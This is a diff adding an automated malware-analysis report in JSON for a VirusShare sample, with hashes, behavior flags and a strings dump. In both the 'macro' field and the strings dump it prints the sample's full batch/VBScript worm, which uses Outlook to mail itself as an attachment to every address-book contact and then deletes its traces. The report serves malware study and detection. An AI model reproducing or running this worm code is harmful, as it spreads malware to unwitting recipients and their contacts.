@@ -1,0 +1,58 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "copy %0 C:\\ATTACHMENT.bat\ncopy %0 C:\\kvqim.vbs\necho Dim x > C:\\kvqim.vbs\necho.on error resume next >> C:\\kvqim.vbs\necho Set fso =\" Scripting.FileSystem.Object\" >> C:\\kvqim.vbs\necho Set so=CreateObject(fso) >> C:\\kvqim.vbs\necho Set ol=CreateObject(\"Outlook.Application\") >> C:\\kvqim.vbs\necho Set out=WScript.CreateObject(\"Outlook.Application\") >> C:\\kvqim.vbs\necho Set mapi = out.GetNameSpace(\"MAPI\") >> C:\\kvqim.vbs\necho Set a = mapi.AddressLists(1) >> C:\\kvqim.vbs\necho Set ae=a.AddressEntries >> C:\\kvqim.vbs\necho For x=1 To ae.Count >> C:\\kvqim.vbs\necho Set ci=ol.CreateItem(0) >> C:\\kvqim.vbs\necho Set Mail=ci >> C:\\kvqim.vbs\necho Mail.to=ol.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(x) >> C:\\kvqim.vbs\necho Mail.Subject=\"SUBJECT\" >> C:\\kvqim.vbs\necho Mail.Body=\"BODY\" >> C:\\kvqim.vbs\necho Mail.Attachments.Add(\"C:\\ATTACHMENT.bat\") >> C:\\kvqim.vbs\necho Mail.Send >> C:\\kvqim.vbs\necho Next >> C:\\kvqim.vbs\necho ol.Quit >> C:\\kvqim.vbs\ncscript C:\\kvqim.vbs\ndel C:\\kvqim.vbs\ndel C:\\ATTACHMENT.bat"
+    },
+    "filename": "VirusShare_2e728958bf1a78054543ab1287933ddc",
+    "filesize": 1030,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2e728958bf1a78054543ab1287933ddc",
+        "sha1": "e0534ffb6785034b974a89bdac081d58afba55d5",
+        "sha256": "9d20e6e9f828c0e8db98ebafdf4be64ad78768224f99a34dc1c28d57b073dbac"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "copy %0 C:\\ATTACHMENT.bat",
+            "copy %0 C:\\kvqim.vbs",
+            "echo Dim x > C:\\kvqim.vbs",
+            "echo.on error resume next >> C:\\kvqim.vbs",
+            "echo Set fso =\" Scripting.FileSystem.Object\" >> C:\\kvqim.vbs",
+            "echo Set so=CreateObject(fso) >> C:\\kvqim.vbs",
+            "echo Set ol=CreateObject(\"Outlook.Application\") >> C:\\kvqim.vbs",
+            "echo Set out=WScript.CreateObject(\"Outlook.Application\") >> C:\\kvqim.vbs",
+            "echo Set mapi = out.GetNameSpace(\"MAPI\") >> C:\\kvqim.vbs",
+            "echo Set a = mapi.AddressLists(1) >> C:\\kvqim.vbs",
+            "echo Set ae=a.AddressEntries >> C:\\kvqim.vbs",
+            "echo For x=1 To ae.Count >> C:\\kvqim.vbs",
+            "echo Set ci=ol.CreateItem(0) >> C:\\kvqim.vbs",
+            "echo Set Mail=ci >> C:\\kvqim.vbs",
+            "echo Mail.to=ol.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(x) >> C:\\kvqim.vbs",
+            "echo Mail.Subject=\"SUBJECT\" >> C:\\kvqim.vbs",
+            "echo Mail.Body=\"BODY\" >> C:\\kvqim.vbs",
+            "echo Mail.Attachments.Add(\"C:\\ATTACHMENT.bat\") >> C:\\kvqim.vbs",
+            "echo Mail.Send >> C:\\kvqim.vbs",
+            "echo Next >> C:\\kvqim.vbs",
+            "echo ol.Quit >> C:\\kvqim.vbs",
+            "cscript C:\\kvqim.vbs",
+            "del C:\\kvqim.vbs",
+            "del C:\\ATTACHMENT.bat"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.289979",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
